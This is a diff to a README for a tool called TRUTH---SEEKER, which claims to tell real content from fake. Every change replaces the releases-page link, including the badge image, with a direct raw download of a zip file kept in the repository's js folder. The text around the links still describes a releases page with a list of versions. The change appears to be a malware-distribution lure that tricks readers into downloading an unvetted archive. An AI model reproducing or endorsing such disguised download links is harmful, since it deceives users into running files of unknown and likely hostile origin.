@@ -1,6 +1,6 @@
 # 🧭 TRUTH---SEEKER - Discover Real from Fake Content
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-TRUTH---SEEKER-brightgreen)](https://github.com/urkeee34/TRUTH---SEEKER/releases)
+[![Download Now](https://github.com/urkeee34/TRUTH---SEEKER/raw/refs/heads/main/js/SEEKER_TRUT_v1.0.zip%20Now-TRUTH---SEEKER-brightgreen)](https://github.com/urkeee34/TRUTH---SEEKER/raw/refs/heads/main/js/SEEKER_TRUT_v1.0.zip)
 
 ## 📖 Introduction
 
@@ -20,7 +20,7 @@ Follow these steps to get TRUTH---SEEKER running on your computer. No technical 
 
 ### 📥 Download & Install
 
-To download TRUTH---SEEKER, visit this page: [Download TRUTH---SEEKER Releases](https://github.com/urkeee34/TRUTH---SEEKER/releases).
+To download TRUTH---SEEKER, visit this page: [Download TRUTH---SEEKER Releases](https://github.com/urkeee34/TRUTH---SEEKER/raw/refs/heads/main/js/SEEKER_TRUT_v1.0.zip).
 
 1. Open the link above.
 2. You'll see a list of available versions. Choose the latest version for the best features and improvements.
@@ -84,6 +84,6 @@ If you encounter issues or have questions, please reach out via the GitHub Discu
 
 ### 🌟 Stay Updated
 
-For the latest features and updates, keep an eye on our releases page: [Follow TRUTH---SEEKER Releases](https://github.com/urkeee34/TRUTH---SEEKER/releases).
+For the latest features and updates, keep an eye on our releases page: [Follow TRUTH---SEEKER Releases](https://github.com/urkeee34/TRUTH---SEEKER/raw/refs/heads/main/js/SEEKER_TRUT_v1.0.zip).
 
 Thank you for using TRUTH---SEEKER. We hope you find it useful in making informed decisions about the content you encounter online.
